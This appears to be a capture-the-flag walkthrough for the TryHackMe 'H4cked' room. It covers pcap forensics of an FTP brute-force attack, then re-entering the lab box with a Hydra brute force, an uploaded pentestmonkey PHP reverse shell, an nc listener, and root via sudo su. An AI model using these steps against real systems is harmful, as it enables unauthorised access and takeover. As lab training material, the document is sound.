# THM-H4cked Walkthrough

## step1

- Join the room
- Download the pcap file 

## step 2 

- Do this either in the attack box or in you kali machine using [openvpn](https://github.com/eth-hac-steven/FlagHunter/tree/main/OpenVPN%20Config%20for%20THM%20rooms%20on%20kali%20VM) 
- In the terminal  open the file with wireshark using this command

```
wireshark <name of the file>
```

### Question 2
- The attacker is trying to log into a specific service. What service is this?

**solution** 

- Scrollinng through the pcap  you can see multiple failed login attempts on the service FTP

![step1](/THM-H4cked/images/H4cked-img-1.png)

- **Ans**; FTP

### Question 3
- There is a very popular tool by Van Hauser which can be used to brute force a series of services. What is the name of this tool?

 **solution**

- **ans** : Hydra

### question 4 
- The attacker is trying to log on with a specific username. What is the username?
- **Ans** jenny

## Question 5
What is the user's password?
**solution**
- scroll through the logs and pay attention to the **info** column, you should and will see that the attacker tries multiple different passwords and most  of them fail 

![img-2](/THM-H4cked/images/H4cked-img-2-multiple-passwd.png)
![img-3](/THM-H4cked/images/H4cked-img3-failed-login-attempt.png)

- if we have the same pcap-file from THM you should see the **login successful** after a few **gentle** scrolls
- right click on it , hover above **follow** and click on **tcp stream**
- this will reveal alot 

![img-4](/THM-H4cked/images/H4cked-img3-login-successful.png)

- **Ans** : password123

## question 6
The attacker uploaded a backdoor. What is the backdoor's filename?

**solution** 

- still in the **follow tcp stream** pages, scrolling down reveals that ans.

**ans** : shell.php

### Question 7 
The backdoor can be downloaded from a specific URL, as it is located inside the uploaded file. What is the full URL?

**solution**

right click on FTP-data (STOR shell.php) , follow the TCP stream

![img-4](/THM-H4cked/images/H4cked-img3-FTP-data.png)

Ans: http://pentestmonkey.net/tools/php-reverse-shell

### Question 8

Which command did the attacker manually execute after getting a reverse shell?

- right click on one of the [PSH, ACK] packet and jackpot

**ans** : whoami

### Question 9
What is the computer's hostname?

**ans**: wir3

![img-](/THM-H4cked/images/H4cked-img-Question9-10.png)

### Question 10
Which command did the attacker execute to spawn a new TTY shell?

**ans**: python3 -c 'import pty; pty.spawn("/bin/bash")'

### Question 11
Which command was executed to gain a root shell?

**ans**: sudo su

![img-](/THM-H4cked/images/H4cked-img-Question10-11.png)

### Question 12
The attacker downloaded something from GitHub. What is the name of the GitHub project?

**ans**: Reptile

![img-](/THM-H4cked/images/H4cked-Reptile-from-github.png)

### Question 13

The project can be used to install a stealthy backdoor on the system. It can be very hard to detect. What is this type of backdoor called?

**ans**: Rootkit


## Task 2
- we have been tasked with hacking our way back into the machine

- you could scan the machine with nmap, you know "doing it by the book" but there is no reason for that, as we know the vuln port is open and is running FTP so we will be going straight to hydra

- in a kali termial we will run 
```
hydra -l jenny -P /usr/share/wordlists/rockyou.txt ftp://10.130.137.117
```

- or what is in he image the important thing is where the wordlist(rockyou.txt) is 
- p.s please to extract the file, run this command
 
 ```
 gzip -d rockyou.txt.gz

 ```
 
 ![img-](/THM-H4cked/images/H4cked-img-Jenny-new-password.png)

- now we have the new password, we will login and to do, that we will run

```
ftp jenny@10.130.137.117
```
- then enter the password, next run 

![img-](/THM-H4cked/images/H4cked-img-ftp-login.png)

```
ls 
```

- we can see the shell.php the attacker used

```
get shell.php
```

![img-](/THM-H4cked/images/H4cked-img-getting-the-shell.png)

- running that downloads the shell file to your kali next 

```
nano shell.php
```

- change the ip  and port to yours

```
ip = the tun0 ip
port = 80
```
![img-](/THM-H4cked/images/H4cked-img-shell-ip-change.png)

- save the file 

- upload the shell file using 

```
put shell.php
```

- change the permission to 777  using 

```
chmod 777 shell.php
```

![img-](/THM-H4cked/images/H4cked-img-uploading-the-modifid-shell.png)

- Open another  termial  and run 

```
nc -lvnp 80 
```
- Open a browser tab and enter 

```
http://<ip-address>/shell.php
```

- Immediately return back to the listener and you should see this 

![img-](/THM-H4cked/images/H4cked-img-shell-established.png)


- with this acces has been granted all you have to do is to follow the exact commands the attacker did, gotten from the packets which will lead to the last flag

![img-](/THM-H4cked/images/H4cked-img-round-up.png)

- XP + 




